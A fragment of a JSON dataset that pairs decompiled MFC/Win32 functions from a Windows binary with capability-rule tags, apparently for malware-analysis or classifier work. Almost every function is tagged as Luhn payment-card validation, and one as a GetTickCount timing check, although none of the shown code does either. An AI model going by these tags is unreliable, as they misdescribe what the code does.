        "decompiled_code": "\nvoid __cdecl fcn.0043042c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uchar lpString1;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    if (arg_8h != 0) goto code_r0x00430451;\n    do {\n        fcn.00411e42();\ncode_r0x00430451:\n    } while (arg_ch == 0);\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_ch);\n    lpString1 = 0;\n    fcn.00462290(&var_103h, 0, 0xff);\n    if (uVar1 < 0x101) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowTextA)(arg_8h, &lpString1, 0x100);\n        if (uVar2 == uVar1) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&lpString1, arg_ch);\n            if (iVar3 == 0) goto code_r0x004304b1;\n        }\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(arg_8h, arg_ch);\ncode_r0x004304b1:\n    fcn.0045e747(unaff_EBX);\n    return;\n}\n",
        "token_count": 346
    },
    "00430564": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430564(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint uVar3;\n    uint *arg_8h_00;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    if (arg_ch == NULL) {\n        fcn.00411e42();\n    }\n    arg_8h_00 = &var_104h;\n    iVar1 = fcn.00423ed7(arg_8h, arg_8h_00, 0x100);\n    if (iVar1 != 0) {\n        puVar2 = fcn.00463968(&var_104h, 10);\n        if (puVar2 != NULL) {\n            uVar3 = fcn.004646ee(puVar2 + 1);\n            *arg_ch = uVar3;\n            uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(uVar3, *0x4bb5f4, 0x48);\n            *arg_ch = uVar3;\n            *puVar2 = 0;\n        }\n        uVar3 = fcn.004628b9(arg_ch + 7, 0x20, &var_104h, 0xffffffff);\n        fcn.00401000(uVar3);\n    }\n    fcn.0045e747(arg_8h_00);\n    return;\n}\n",
        "token_count": 339
    },
    "00430c5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: lpCriticalSection\n\nvoid __cdecl fcn.00430c5f(uint arg_8h, uint arg_ch)\n\n{\n    code **ppcVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint *extraout_ECX;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint lpCriticalSection;\n    uint *puVar5;\n    uint var_4h;\n    \n    fcn.004627e2(0x10);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    puVar5 = extraout_ECX + 7;\n    *(unaff_EBP + -0x14) = puVar5;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar5);\n    if ((*(unaff_EBP + 8) < 1) || (extraout_ECX[3] <= *(unaff_EBP + 8))) goto code_r0x00430d86;\n    ppcVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*extraout_ECX);\n    if (ppcVar1 == NULL) {\n        *(unaff_EBP + -4) = 0;\n        ppcVar1 = fcn.0043088b(0x10);\n        if (ppcVar1 == NULL) {\n            ppcVar1 = NULL;\n        }\n        else {\n            *ppcVar1 = vtable.CThreadData.0;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        ppcVar1[2] = NULL;\n        ppcVar1[3] = NULL;\n        fcn.00430a08(ppcVar1);\ncode_r0x00430cb6:\n        if (ppcVar1[3] == NULL) {\n            uVar2 = fcn.00402340(extraout_ECX[3], 4);\n            pcVar3 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, uVar2);\n        }\n        else {\n            uVar2 = fcn.00402340(extraout_ECX[3], 4, 2);\n            pcVar3 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)(ppcVar1[3], uVar2);\n        }\n        if (pcVar3 == NULL) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*(unaff_EBP + -0x14));\n            pcVar3 = fcn.00411e0e();\n        }\n        ppcVar1[3] = pcVar3;\n        fcn.00462290(pcVar3 + ppcVar1[2] * 4, 0, (extraout_ECX[3] - ppcVar1[2]) * 4);\n        ppcVar1[2] = extraout_ECX[3];\n        (*_sym.imp.KERNEL32.dll_TlsSetValue)(*extraout_ECX, ppcVar1);\n        iVar4 = *(unaff_EBP + 8);\n    }\n    else {\n        iVar4 = *(unaff_EBP + 8);\n        if ((ppcVar1[2] <= iVar4) && (*(unaff_EBP + 0xc) != 0)) goto code_r0x00430cb6;\n    }\n    if ((ppcVar1[3] != NULL) && (iVar4 < ppcVar1[2])) {\n        *(ppcVar1[3] + iVar4 * 4) = *(unaff_EBP + 0xc);\n    }\n    puVar5 = *(unaff_EBP + -0x14);\ncode_r0x00430d86:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar5);\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 873
    },
    "00431069": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00431069(int32_t param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    if (*(param_1 + 2) == -1) {\n        piVar2 = param_1 + 0x1a;\n    }\n    else {\n        piVar2 = param_1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 250
    },
    "00431d2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00431d2d(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.00431b42(param_1);\n    *param_1 = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00431bf0(unaff_retaddr);\n        *param_1 = iVar1;\n        iVar1 = (-(iVar1 != 0) & 0x7fffbffe) + 0x80004002;\n    }\n    else {\n        fcn.00431ca7();\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 153
    },
    "00431f72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00431f72(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    uVar1 = fcn.0042407a();\n    fcn.0040f840(uVar1);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.0040f670(*(unaff_EBP + 0xc));\n    if (iVar2 != 0) {\n        fcn.00431e30(*(unaff_EBP + 8), *(unaff_EBP + -0x10), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    }\n    fcn.00402740();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 255
    },
    "00432152": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00432152(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    \n    iVar1 = fcn.004320d0(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = iVar1 + 0x1c;\n    if (iVar1 == 0) {\n        fcn.00411e42();\n        iVar1 = extraout_ECX;\n    }\n    if (*(iVar1 + 4) != 0) {\n        for (puVar2 = *(*(iVar1 + 4) + ((unaff_retaddr >> 4) % *(iVar1 + 8)) * 4); puVar2 != NULL; puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 221
    },
    "00432abc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00432abc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    puVar2 = fcn.004328d2(arg_8h, &arg_8h, &var_4h);\n    if (puVar2 == NULL) {\n        if (*(in_ECX + 4) == 0) {\n            fcn.00432834(*(in_ECX + 8), 1);\n        }\n        puVar2 = fcn.00432a6e();\n        puVar2[1] = iVar1;\n        *puVar2 = *(arg_8h * 4 + *(in_ECX + 4));\n        *(arg_8h * 4 + *(in_ECX + 4)) = puVar2;\n    }\n    return puVar2 + 2;\n}\n",
        "token_count": 216
    },
    "00432ead": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00432ead(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043026e();\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + 0x2c);\n    return;\n}\n",
        "token_count": 57
    },
    "004349ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004349ff(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    \n    iVar1 = arg_8h;\n    iVar4 = 0;\n    if (-1 < arg_8h) goto code_r0x00434a15;\n    do {\n        fcn.00411e42();\ncode_r0x00434a15:\n        if (iVar4 <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == iVar4) {\n            fcn.004115a4(*(in_ECX + 4));\n            *(in_ECX + 0xc) = iVar4;\n            *(in_ECX + 8) = iVar4;\n            goto code_r0x00434b19;\n        }\n        if (*(in_ECX + 4) == iVar4) {\n            uVar2 = fcn.00411579(iVar1 << 2);\n            *(in_ECX + 4) = uVar2;\n            fcn.00462290(uVar2, 0, iVar1 << 2);\n            *(in_ECX + 0xc) = iVar1;\ncode_r0x00434a81:\n            *(in_ECX + 8) = iVar1;\n            return;\n        }\n        iVar4 = *(in_ECX + 0xc);\n        if (iVar1 <= iVar4) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00462290(*(in_ECX + 4) + iVar4 * 4, 0, (iVar1 - iVar4) * 4);\n            }\n            goto code_r0x00434a81;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\ncode_r0x00434ab3:\n                iVar3 = 4;\n            }\n            else if (iVar3 < 0x401) {\n                if (iVar3 < 4) goto code_r0x00434ab3;\n            }\n            else {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + iVar4;\n        if (iVar3 + iVar4 <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < iVar4);\n    iVar4 = fcn.00411579(arg_8h << 2);\n    fcn.0041314e(iVar4, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00462290(iVar4 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.004115a4(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x00434b19:\n    *(in_ECX + 4) = iVar4;\n    return;\n}\n",
        "token_count": 772
    },
    "00434c0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434c0e(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.004349ff(iVar1 + arg_10h, 0xffffffff);\n            fcn.00429a2a(*(in_ECX + 4) + (arg_8h + arg_10h) * 4, ((*(in_ECX + 8) - arg_8h) - arg_10h) * 4, \n                         *(in_ECX + 4) + arg_8h * 4, (iVar1 - arg_8h) * 4);\n            fcn.00462290(*(in_ECX + 4) + arg_8h * 4, 0, arg_10h << 2);\n        }\n        else {\n            fcn.004349ff(arg_8h + arg_10h, 0xffffffff);\n        }\n        arg_8h = arg_8h << 2;\n        do {\n            arg_10h = arg_10h + -1;\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 4;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.00411e42();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 389
    },
    "00435277": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435277(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_ECX;\n    uint var_34h;\n    uint var_2ch;\n    uint var_20h;\n    uint var_1ch;\n    \n    fcn.00462290(&var_34h, 0, 0x34);\n    var_2ch = arg_ch;\n    var_1ch = arg_14h;\n    var_20h = arg_10h;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x102d, arg_8h, &var_34h);\n    return;\n}\n",
        "token_count": 165
    },
    "004352bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004352bc(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_34h;\n    uint var_30h;\n    uint var_14h;\n    \n    fcn.00462290(&var_34h, 0, 0x34);\n    var_30h = arg_8h;\n    var_34h = 4;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1005, 0, &var_34h);\n    return var_14h;\n}\n",
        "token_count": 133
    },
    "004376e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004376e8(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    param_1[2] = param_4 + param_2;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    param_1[3] = param_5 + param_3;\n    return;\n}\n",
        "token_count": 107
    },
    "00437937": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437937(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    (**(*in_ECX + 0x140))(&var_10h, in_ECX[0x20] & 0xa000);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 188
    },
    "004379c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004379c1(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00437739(param_1);\n    return -(0xffff < uVar1) & uVar1;\n}\n",
        "token_count": 57
    },
    "004379e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.004379e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint noname_3, uint noname_4, int32_t arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    bool bVar5;\n    bool bVar6;\n    int32_t lpRect;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = 0;\n    if (in_ECX != 0) goto code_r0x004379f6;\n    do {\n        iVar1 = fcn.00411e42();\ncode_r0x004379f6:\n    } while (arg_8h == iVar1);\n    uVar4 = *(in_ECX + 0x80) & 0xa000;\n    var_10h = iVar1;\n    var_ch = iVar1;\n    var_8h = iVar1;\n    var_4h = iVar1;\n    if (*(in_ECX + 0xa0) != iVar1 && iVar1 <= *(in_ECX + 0xa0)) {\n        do {\n            iVar1 = var_4h;\n            piVar2 = fcn.004379c1();\n            if ((piVar2 == NULL) || (iVar3 = (**(*piVar2 + 0x154))(),  iVar3 == 0)) {\n                var_10h = var_10h + (var_8h - *0x4bb5ec);\n                var_8h = 0;\n                iVar1 = arg_20h;\n                if (uVar4 == 0) {\n                    iVar1 = arg_1ch;\n                }\n                if (iVar1 < var_10h) {\n                    if (var_4h == 0) {\n                        fcn.0044bd84(var_ch + 1, 0, 1);\n                    }\n                    iVar3 = var_ch + 1;\n                    goto code_r0x00437af2;\n                }\ncode_r0x00437ac1:\n                var_ch = var_4h;\n            }\n            else {\n                (*_sym.imp.USER32.dll_GetWindowRect)(piVar2[8], &lpRect, iVar1);\n                fcn.0042dd8a(&lpRect);\n                if (uVar4 == 0) {\n                    iVar1 = (var_18h - lpRect) + -1;\n                }\n                else {\n                    iVar1 = var_14h - var_1ch;\n                }\n                if (var_8h <= iVar1) {\n                    if (uVar4 == 0) {\n                        var_8h = (var_18h - lpRect) + -1;\n                    }\n                    else {\n                        var_8h = var_14h - var_1ch;\n                    }\n                }\n                if (uVar4 == 0) {\n                    bVar6 = SBORROW4(arg_10h, var_1ch);\n                    iVar1 = arg_10h - var_1ch;\n                    bVar5 = arg_10h == var_1ch;\n                }\n                else {\n                    bVar6 = SBORROW4(arg_ch, lpRect);\n                    iVar1 = arg_ch - lpRect;\n                    bVar5 = arg_ch == lpRect;\n                }\n                if (!bVar5 && bVar6 == iVar1 < 0) goto code_r0x00437ac1;\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < *(in_ECX + 0xa0));\n        iVar1 = 0;\n    }\n    iVar3 = var_ch + 1;\n    fcn.0044bd84(iVar3, iVar1, 1);\ncode_r0x00437af2:\n    fcn.0044bd84(iVar3, arg_8h, 1);\n    return iVar3;\n}\n",
        "token_count": 940
    },
    "00437c66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00437c66(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    iVar4 = 4;\n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDockBar.0;\n    iVar3 = 0;\n    pcVar1 = extraout_ECX[0x28];\n    *(unaff_EBP + -4) = 1;\n    if (0 < pcVar1) {\n        do {\n            iVar4 = iVar3;\n            iVar2 = fcn.004379c1();\n            if ((iVar2 != 0) && (*(iVar2 + 0x8c) == extraout_ECX)) {\n                *(iVar2 + 0x8c) = 0;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < extraout_ECX[0x28]);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.0044bb65(iVar4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004337ba();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 322
    },
    "00439060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439060(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t Y, uint crColor)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.GDI32.dll_SetBkColor)(*(in_ECX + 4), crColor);\n    var_10h = arg_8h;\n    var_8h = arg_8h + arg_10h;\n    var_ch = arg_ch;\n    var_4h = arg_ch + Y;\n    (*_sym.imp.GDI32.dll_ExtTextOutA)(*(in_ECX + 4), 0, 0, 2, &var_10h, 0, 0, 0);\n    return;\n}\n",
        "token_count": 206
    },
    "004390ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004390ac(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_4h;\n    \n    fcn.00439060(arg_8h, arg_ch, arg_10h + -1, 1, arg_18h);\n    fcn.00439060(arg_8h, arg_ch, 1, arg_14h + -1, arg_18h);\n    fcn.00439060(arg_8h + arg_10h, arg_ch, 0xffffffff, arg_14h, arg_1ch);\n    fcn.00439060(arg_8h, arg_ch + arg_14h, arg_10h, 0xffffffff, arg_1ch);\n    return;\n}\n",
        "token_count": 195
    },
    "004391f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004391f5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint unaff_ESI;\n    uint var_40h;\n    uint var_29h;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    fcn.00462290(&var_40h, 0, 0x3c);\n    var_40h = arg_8h;\n    var_29h._0_1_ = 1;\n    uVar1 = fcn.004628b9(&var_24h, 0x20, arg_ch, 0xffffffff);\n    fcn.00401000(uVar1);\n    fcn.00439116(&var_40h, arg_10h);\n    fcn.0045e747(unaff_ESI);\n    return;\n}\n",
        "token_count": 225
    },
    "0043944f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043944f(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    int32_t lpRect;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        fcn.00411e42();\n    }\n    arg_ch[1] = arg_ch[1] | 0x70;\n    *arg_ch = 0x50;\n    arg_ch[8] = *(arg_8h + 0x20);\n    piVar1 = fcn.0042f550(0x4940a8, arg_8h);\n    if (piVar1 == NULL) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(arg_8h + 0x20), &lpRect);\n        var_8h = var_8h - lpRect;\n        var_4h = var_4h - var_ch;\n    }\n    else {\n        piVar1 = (**(*piVar1 + 0x134))(&var_8h, 0, in_ECX[0x20] & 0xa000);\n        var_8h = *piVar1;\n        var_4h = piVar1[1];\n    }\n    arg_ch[10] = var_4h;\n    if (*0x4b66f8 < 0x40048) {\n        iVar2 = 4;\n    }\n    else {\n        iVar2 = 0;\n    }\n    iVar2 = iVar2 + var_8h;\n    arg_ch[0x11] = iVar2;\n    arg_ch[0xb] = iVar2;\n    if ((arg_ch[2] & 0x200) == 0) {\n        arg_ch[9] = iVar2;\n    }\n    else {\n        arg_ch[1] = arg_ch[1] | 0x200;\n        arg_ch[9] = var_4h;\n    }\n    iVar2 = (**(*in_ECX + 0x110))(0x401, 0xffffffff, arg_ch);\n    if (iVar2 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        piVar1 = fcn.00419143();\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x148))(1);\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[8], 0x41f, 0, 0);\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 603
    },
    "004397f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004397f5(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    fcn.004336a4(&var_10h, (*(in_ECX + 0x80) & 0xa000) != 0);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 190
    },
    "00439e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00439e50(uint param_1)\n\n{\n    fcn.00462290(param_1, 0, 0x10);\n    return;\n}\n",
        "token_count": 38
    },
    "0043a1e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0043a1e6(int16_t *vtime, ulong *arg_ch)\n\n{\n    int32_t iVar1;\n    uint wVerMinor;\n    uint var_ah;\n    int16_t var_6h;\n    int16_t var_4h;\n    \n    if (arg_ch == NULL) {\n        fcn.00401280(0x80004005);\n    }\n    iVar1 = (*_sym.imp.OLEAUT32.dll_VariantTimeToSystemTime)(vtime, arg_ch);\n    fcn.00462290(&wVerMinor, 0, 0x10);\n    if (((((iVar1 != 0) && (iVar1 = (*_sym.imp.OLEAUT32.dll_UnRegisterTypeLib)(*arg_ch, &wVerMinor),  iVar1 != 0)) &&\n         (*vtime == wVerMinor)) && ((vtime[1] == wVerMinor._2_2_ && (vtime[3] == var_ah)))) &&\n       ((vtime[4] == var_ah._2_2_ && ((vtime[5] == var_6h && (vtime[6] == var_4h)))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 284
    },
    "0043a4a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043a4a7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_10h;\n    uint var_ah;\n    ushort var_6h;\n    ushort var_4h;\n    \n    fcn.00462290(&var_10h, 0, 0x10);\n    var_10h._0_2_ = arg_8h;\n    var_10h._2_2_ = arg_ch;\n    var_ah._0_2_ = arg_10h;\n    var_ah._2_2_ = arg_14h;\n    var_6h = arg_18h;\n    var_4h = arg_1ch;\n    iVar1 = fcn.0043a1e6(&var_10h, in_ECX);\n    *(in_ECX + 8) = iVar1 == 0;\n    return;\n}\n",
        "token_count": 247
    },
    "0043a56a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a56a(uint psa, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)(psa, &var_4h);\n    fcn.0043988c(uVar1);\n    fcn.0041314e(var_4h, arg_10h, arg_ch, arg_10h);\n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)(psa);\n    fcn.0043988c(uVar1);\n    return;\n}\n",
        "token_count": 148
    },
    "0043aefb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
